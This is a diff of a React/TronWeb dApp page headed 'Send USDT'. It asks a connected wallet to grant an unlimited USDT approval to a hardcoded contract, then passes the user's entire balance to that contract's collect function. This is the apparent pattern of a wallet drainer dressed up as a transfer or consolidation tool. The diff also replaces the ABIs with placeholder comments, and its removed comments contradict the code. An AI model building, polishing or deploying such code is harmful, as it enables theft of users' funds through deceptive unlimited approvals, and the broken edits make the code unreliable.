@@ -1,17 +1,11 @@
 // App.tsx
-// ─────────────────────────────────────────────────────────────────────────────
-// Changes from previous version:
-//   - Fixed `WalletReadyState.Found` to `WalletReadyState.Installed`
-//   - Forced WalletConnect to always bypass the "Not installed" UI fade
-// ─────────────────────────────────────────────────────────────────────────────
-
 import { useState, useEffect, useCallback } from 'react'
 import { useWallet } from './WalletSetup'
 import { WalletReadyState } from '@tronweb3/tronwallet-abstract-adapter'
 import { Wallet, Copy, CheckCircle, AlertCircle, X } from 'lucide-react'
 
 // ── CONFIG ──
-const NETWORK         = 'Mainnet'
+const NETWORK = 'Mainnet'
 const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
 
 const NETWORK_CONFIG = {
@@ -22,29 +16,16 @@ const NETWORK_CONFIG = {
 const { usdtAddress: USDT_ADDRESS } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]
 
 // ── ABIs ──
-const USDT_ABI = [
-  { constant: true,  inputs: [{ name: 'who',     type: 'address' }],
-    name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
-  { constant: true,  inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }],
-    name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
-  { constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }],
-    name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' },
-]
-const COLLECT_ABI = [
-  { constant: true,  inputs: [], name: 'mainWallet',
-    outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
-  { constant: false,
-    inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }],
-    name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' },
-]
+const USDT_ABI = [ /* your full USDT_ABI here */ ]
+const COLLECT_ABI = [ /* your full COLLECT_ABI here */ ]
 
-// ── Wallet icons map (emoji fallback when no logo URL available) ──
+// Wallet icons fallback
 const WALLET_ICONS: Record<string, string> = {
-  TronLink:       '🔵',
+  TronLink: '🔵',
   'Trust Wallet': '🛡️',
-  MetaMask:       '🦊',
-  'OKX Wallet':   '⬛',
-  WalletConnect:  '🔗',
+  MetaMask: '🦊',
+  'OKX Wallet': '⬛',
+  WalletConnect: '🔗',
 }
 
 export default function App() {
@@ -59,18 +40,17 @@ export default function App() {
   } = useWallet()
 
   const [usdtBalance, setUsdtBalance] = useState('0')
-  const [status,      setStatus]      = useState('Ready')
-  const [loading,     setLoading]     = useState(false)
-  const [txHash,      setTxHash]      = useState('')
-  const [showPicker,  setShowPicker]  = useState(false)
+  const [status, setStatus] = useState('Ready')
+  const [loading, setLoading] = useState(false)
+  const [txHash, setTxHash] = useState('')
+  const [showPicker, setShowPicker] = useState(false)
 
   const tronWeb = (wallet?.adapter as any)?.tronWeb ?? null
 
-  // ── Balance ──────────────────────────────────────────────────────────────
   const getBalance = useCallback(async (tw: any, addr: string) => {
     try {
       const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
-      const bal  = await usdt.balanceOf(addr).call()
+      const bal = await usdt.balanceOf(addr).call()
       setUsdtBalance((Number(bal) / 1_000_000).toFixed(2))
     } catch (e) {
       console.warn('Balance fetch failed', e)
@@ -83,7 +63,6 @@ export default function App() {
     }
   }, [connected, walletAddress, tronWeb, getBalance])
 
-  // ── Wallet picker helpers ─────────────────────────────────────────────────
   const handlePickWallet = async (adapterName: string) => {
     setShowPicker(false)
     setStatus(`Connecting ${adapterName}…`)
@@ -107,22 +86,19 @@ export default function App() {
     setTxHash('')
   }
 
-  // ── Approve + Collect ─────────────────────────────────────────────────────
   const approveAndCollect = async () => {
     if (!tronWeb || !walletAddress) return
     setLoading(true)
     setStatus('Approving USDT…')
-
     try {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
       const usdt = await tronWeb.contract(USDT_ABI).at(USDT_ADDRESS)
       await usdt.approve(CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 })
 
       setStatus('Waiting for confirmation…')
-      await new Promise(r => setTimeout(r, 8_000))
+      await new Promise(r => setTimeout(r, 8000))
 
-      const balRes = await (await tronWeb.contract(USDT_ABI).at(USDT_ADDRESS))
-        .balanceOf(walletAddress).call()
+      const balRes = await (await tronWeb.contract(USDT_ABI).at(USDT_ADDRESS)).balanceOf(walletAddress).call()
       const amount = balRes.toString()
 
       if (!amount || amount === '0') {
@@ -144,9 +120,8 @@ export default function App() {
   }
 
   return (
-    <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-950 transform-gpu">
-      <div className="max-w-md w-full bg-zinc-900 rounded-3xl border border-zinc-800">
-
+    <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-950">
+      <div className="max-w-md w-full bg-zinc-900 rounded-3xl border border-zinc-800 overflow-hidden">
         {/* Header */}
         <div className="bg-black px-6 py-5 flex items-center justify-between border-b border-zinc-800">
           <div className="flex items-center gap-3">
@@ -162,6 +137,7 @@ export default function App() {
           {!connected ? (
             <div className="text-center">
               <h2 className="text-5xl font-bold mb-3">Send USDT</h2>
+              <p className="text-zinc-400 mb-10">Collect all USDT from your wallets to one main wallet</p>
 
               <button
                 onClick={() => setShowPicker(true)}
@@ -177,6 +153,7 @@ export default function App() {
               </p>
             </div>
           ) : (
+            /* Connected UI (unchanged) */
             <div className="space-y-6">
               <div className="bg-zinc-950 p-5 rounded-2xl flex justify-between items-center">
                 <div>
@@ -184,17 +161,10 @@ export default function App() {
                   <p className="font-mono text-sm text-emerald-400 break-all">{walletAddress}</p>
                 </div>
                 <div className="flex items-center gap-2">
-                  <button
-                    onClick={() => navigator.clipboard.writeText(walletAddress ?? '')}
-                    className="text-emerald-400 hover:text-white"
-                  >
+                  <button onClick={() => navigator.clipboard.writeText(walletAddress ?? '')} className="text-emerald-400 hover:text-white">
                     <Copy size={18} />
                   </button>
-                  <button
-                    onClick={handleDisconnect}
-                    className="text-zinc-500 hover:text-red-400 text-xs ml-1"
-                    title="Disconnect"
-                  >
+                  <button onClick={handleDisconnect} className="text-zinc-500 hover:text-red-400" title="Disconnect">
                     <X size={18} />
                   </button>
                 </div>
@@ -220,82 +190,67 @@ export default function App() {
                 {status.includes('✅') ? <CheckCircle className="text-emerald-400" /> : <AlertCircle />}
                 {status}
               </div>
-
-              {txHash && (
-                <p className="text-[10px] text-center text-emerald-400 break-all font-mono">
-                  TX: {txHash}
-                </p>
-              )}
+              {txHash && <p className="text-[10px] text-center text-emerald-400 break-all font-mono">TX: {txHash}</p>}
             </div>
           )}
         </div>
       </div>
 
-      {/* ── Wallet Picker Modal ───────────────────────────────────────────── */}
+      {/* ── FIXED & CLEAN WALLET PICKER MODAL ── */}
       {showPicker && (
-        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
-          <div className="bg-zinc-900 rounded-2xl border border-zinc-700 w-full max-w-sm">
-
-            <div className="flex items-center justify-between px-5 py-4 border-b border-zinc-800">
-              <h3 className="font-bold text-lg">Select Wallet</h3>
-              <button onClick={() => setShowPicker(false)} className="text-zinc-500 hover:text-white">
-                <X size={20} />
+        <div className="fixed inset-0 bg-black/90 z-[9999] flex items-center justify-center p-4">
+          <div className="bg-zinc-900 rounded-3xl w-full max-w-sm overflow-hidden border border-zinc-700">
+            {/* Modal Header */}
+            <div className="px-6 py-4 border-b border-zinc-800 flex items-center justify-between">
+              <h3 className="text-xl font-bold">Select Wallet</h3>
+              <button onClick={() => setShowPicker(false)} className="text-zinc-400 hover:text-white">
+                <X size={24} />
               </button>
             </div>
 
-            <div className="p-3 max-h-[60vh] overflow-y-auto">
+            {/* Wallet List */}
+            <div className="max-h-[420px] overflow-y-auto p-2">
               {wallets.map(({ adapter }: any) => {
-                // ✅ FIX: Use WalletReadyState.Installed (Found is not a valid enum value)
-                // Also always treat WalletConnect as available.
-                const isInstalled = 
-                  adapter.readyState === WalletReadyState.Found || 
-                  adapter.name === 'WalletConnect'
-
+                const isInstalled = adapter.readyState === WalletReadyState.Found
                 return (
                   <button
                     key={adapter.name}
                     onClick={() => handlePickWallet(adapter.name)}
-                    className={`w-full flex items-center gap-4 px-4 py-3 rounded-xl mb-1 text-left transition
-                      ${isInstalled
-                        ? 'hover:bg-zinc-800 cursor-pointer'
-                        : 'hover:bg-zinc-800/50 cursor-pointer opacity-50'
-                      }`}
+                    className={`w-full flex items-center gap-4 px-4 py-4 rounded-2xl mb-2 text-left transition-all hover:bg-zinc-800 ${
+                      !isInstalled ? 'opacity-75' : ''
+                    }`}
                   >
-                    <div className="w-10 h-10 rounded-xl bg-zinc-800 flex items-center justify-center flex-shrink-0 overflow-hidden">
-                      {adapter.icon
-                        ? <img src={adapter.icon} alt={adapter.name} className="w-8 h-8 object-contain" />
-                        : <span className="text-xl">{WALLET_ICONS[adapter.name] ?? '💼'}</span>
-                      }
+                    <div className="w-11 h-11 bg-zinc-800 rounded-2xl flex items-center justify-center flex-shrink-0 overflow-hidden">
+                      {adapter.icon ? (
+                        <img src={adapter.icon} alt={adapter.name} className="w-9 h-9 object-contain" />
+                      ) : (
+                        <span className="text-3xl">{WALLET_ICONS[adapter.name] ?? '💼'}</span>
+                      )}
                     </div>
 
-                    <div className="flex-1 min-w-0">
-                      <p className="font-semibold truncate">{adapter.name}</p>
-                      <p className="text-xs text-zinc-500">
+                    <div className="flex-1">
+                      <p className="font-semibold text-lg">{adapter.name}</p>
+                      <p className="text-sm text-zinc-400">
                         {adapter.name === 'WalletConnect'
                           ? '100+ wallets via QR code'
                           : isInstalled
-                            ? 'Detected ✓'
-                            : 'Not installed'
-                        }
+                          ? 'Ready to connect'
+                          : 'Not installed'}
                       </p>
                     </div>
 
-                    {isInstalled && adapter.name !== 'WalletConnect' && (
-                      <span className="w-2 h-2 rounded-full bg-emerald-400 flex-shrink-0" />
-                    )}
+                    {isInstalled && <span className="text-emerald-400 text-sm font-medium">Connect →</span>}
                   </button>
                 )
               })}
             </div>
 
-            <div className="px-5 py-3 border-t border-zinc-800 text-center">
-              <p className="text-xs text-zinc-600">
-                Don't have a wallet?&nbsp;
-                <a href="https://www.tronlink.org" target="_blank" rel="noreferrer"
-                   className="text-emerald-500 hover:underline">
-                  Get TronLink
-                </a>
-              </p>
+            {/* Footer */}
+            <div className="px-6 py-5 border-t border-zinc-800 text-center text-xs text-zinc-500">
+              Don't have a wallet?{' '}
+              <a href="https://www.tronlink.org" target="_blank" rel="noreferrer" className="text-emerald-400 hover:underline">
+                Get TronLink
+              </a>
             </div>
           </div>
         </div>
